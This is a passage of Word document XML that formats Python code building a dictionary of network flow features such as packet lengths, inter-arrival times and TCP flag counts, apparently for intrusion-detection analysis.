      </w:r>
    </w:p>
    <w:p w14:paraId="010F7781">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow Duration": duration_us,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114687A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Total Fwd Packets": float(n_fwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66747373">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Total Backward Packets": float(n_bwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D49C08E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Total Length of Fwd Packets": float(sum(flow.fwd_len)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DD7A7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Total Length of Bwd Packets": float(sum(flow.bwd_len)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D40FD30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Packet Length Max": float(f_max),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA06339">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Packet Length Min": float(f_min),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E3A2E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Packet Length Mean": f_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D040C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Packet Length Std": f_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563F8FD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Packet Length Max": float(b_max),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B01C976">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Packet Length Min": float(b_min),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC6509D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Packet Length Mean": b_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D17FF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Packet Length Std": b_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDB2303">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow Bytes/s": total_bytes / duration_s,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A05F6BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow Packets/s": total_pkts / duration_s,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA80932">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow IAT Mean": ai_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC5D124">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow IAT Std": ai_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E134D31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow IAT Max": ai_max,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46045F38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Flow IAT Min": ai_min,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205FA75E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd IAT Total": float(sum(fwd_iats)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B77D523">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd IAT Mean": fi_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419CECEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd IAT Std": fi_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38348FBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd IAT Max": fi_max,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799E645D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd IAT Min": fi_min,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364279A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd IAT Total": float(sum(bwd_iats)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78696A62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd IAT Mean": bi_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BE3D9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd IAT Std": bi_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A90A234">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd IAT Max": bi_max,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C91B35F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd IAT Min": bi_min,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E18267">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd PSH Flags": _bit(flow.flags["fwd_psh"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A76406">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd PSH Flags": _bit(flow.flags["bwd_psh"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5745E96D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd URG Flags": _bit(flow.flags["fwd_urg"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7D9B95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd URG Flags": _bit(flow.flags["bwd_urg"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CBED8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Header Length": float(flow.fwd_hdr),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366DCA05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Header Length": float(flow.bwd_hdr),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EEAF91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Packets/s": n_fwd / duration_s,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BF7D40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Packets/s": n_bwd / duration_s,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6472801F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Min Packet Length": float(p_min),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17153105">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Max Packet Length": float(p_max),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369E6275">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Packet Length Mean": p_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194005E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Packet Length Std": p_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47845E21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Packet Length Variance": p_std ** 2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034E5992">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "FIN Flag Count": _bit(flow.flags["fin"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51796B13">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "SYN Flag Count": _bit(flow.flags["syn"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370C66F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "RST Flag Count": _bit(flow.flags["rst"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DD65EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "PSH Flag Count": _bit(flow.flags["psh"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05456C14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "ACK Flag Count": _bit(flow.flags["ack"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737835D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "URG Flag Count": _bit(flow.flags["urg"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168EB866">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "CWE Flag Count": _bit(flow.flags["cwr"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671983B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "ECE Flag Count": _bit(flow.flags["ece"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CD81F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Down/Up Ratio": (n_bwd / n_fwd) if n_fwd else 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CBF1DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Average Packet Size": (total_bytes / total_pkts) if total_pkts else 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C87200">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Avg Fwd Segment Size": (sum(flow.fwd_len) / n_fwd) if n_fwd else 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0939D216">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
